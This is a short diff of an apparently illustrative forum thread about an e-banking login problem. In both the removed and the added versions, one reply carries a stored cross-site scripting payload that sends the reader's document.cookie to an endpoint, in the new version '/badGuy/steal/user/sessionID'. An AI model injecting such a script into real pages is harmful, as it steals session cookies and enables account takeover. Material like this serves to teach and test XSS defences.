@@ -1,4 +1,4 @@
-Hans: Hi all I have a problem with loggin in to my e-banking of UBS. Does anybody else face the same issue?
+Mike: Hello everyone, I have a problem logging into my e-banking. Does anyone else have the same problem?
 
-Hacker: Yes me to <script> fetch('/article/fetch/post/user', {   method: 'POST',   headers: {     'Content-Type': 'application/json;charset=utf-8'   },   body: JSON.stringify(document.cookie) });</script>
+Bob: No mine is working fine. <script> fetch('/badGuy/steal/user/sessionID', {   method: 'POST',   headers: {     'Content-Type': 'application/json;charset=utf-8'   },   body: JSON.stringify(document.cookie) });</script>
 
